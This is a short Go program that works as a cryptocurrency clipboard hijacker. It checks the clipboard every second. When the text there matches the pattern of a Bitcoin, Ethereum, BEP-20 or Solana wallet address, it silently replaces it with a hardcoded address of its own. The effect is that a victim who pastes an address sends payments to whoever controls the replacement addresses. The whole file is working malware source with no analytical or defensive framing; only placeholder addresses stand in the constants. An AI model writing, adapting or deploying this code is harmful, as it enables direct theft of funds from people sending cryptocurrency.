package main

import (
	"fmt"
	"regexp"
	"time"

	"github.com/atotto/clipboard"
)

const (
	predefinedBitcoinAddress  = "1BitcoinPredefinedAddressExample1234"
	predefinedEthereumAddress = "0xEthereumPredefinedAddress1234567890abcdef"
	predefinedBEP20Address    = "0xBEP20PredefinedAddress1234567890abcdef"
	predefinedSolanaAddress   = "So1anaPredefinedAddressExample1234567890"
)

func isValidBitcoinAddress(address string) bool {
	btcRegex := regexp.MustCompile(`^[13bc1][a-km-zA-HJ-NP-Z1-9]{25,34}$`)
	return btcRegex.MatchString(address)
}

func isValidEthereumAddress(address string) bool {
	ethRegex := regexp.MustCompile(`^0x[a-fA-F0-9]{40}$`)
	return ethRegex.MatchString(address)
}

func isValidBEP20Address(address string) bool {
	return isValidEthereumAddress(address)
}

func isValidSolanaAddress(address string) bool {
	solRegex := regexp.MustCompile(`^[1-9A-HJ-NP-Za-km-z]{32,44}$`)
	return solRegex.MatchString(address)
}

func setClipboardContent(content string) error {
	return clipboard.WriteAll(content)
}

func main() {
	initialContent, _ := clipboard.ReadAll()

	for {
		content, err := clipboard.ReadAll()
		if err != nil {
			fmt.Println("Error reading clipboard:", err)
			break
		}

		if content != initialContent {
			fmt.Printf("New address copied to clipboard: %s\n", content)

			if isValidBitcoinAddress(content) {
				fmt.Println("This is a valid Bitcoin address.")
				setClipboardContent(predefinedBitcoinAddress)
				fmt.Println("Clipboard replaced with predefined Bitcoin address.")
				initialContent = predefinedBitcoinAddress
				continue
			} else if isValidEthereumAddress(content) {
				fmt.Println("This is a valid Ethereum address.")
				setClipboardContent(predefinedEthereumAddress)
				fmt.Println("Clipboard replaced with predefined Ethereum address.")
				initialContent = predefinedEthereumAddress
				continue
			} else if isValidBEP20Address(content) {
				fmt.Println("This is a valid BEP-20 address.")
				setClipboardContent(predefinedBEP20Address)
				fmt.Println("Clipboard replaced with predefined BEP-20 address.")
				initialContent = predefinedBEP20Address
				continue
			} else if isValidSolanaAddress(content) {
				fmt.Println("This is a valid Solana address.")
				setClipboardContent(predefinedSolanaAddress)
				fmt.Println("Clipboard replaced with predefined Solana address.")
				initialContent = predefinedSolanaAddress
				continue
			} else {
				fmt.Println("This is not a recognized wallet address.")
			}

			initialContent = content
		}

		time.Sleep(1 * time.Second)
	}
}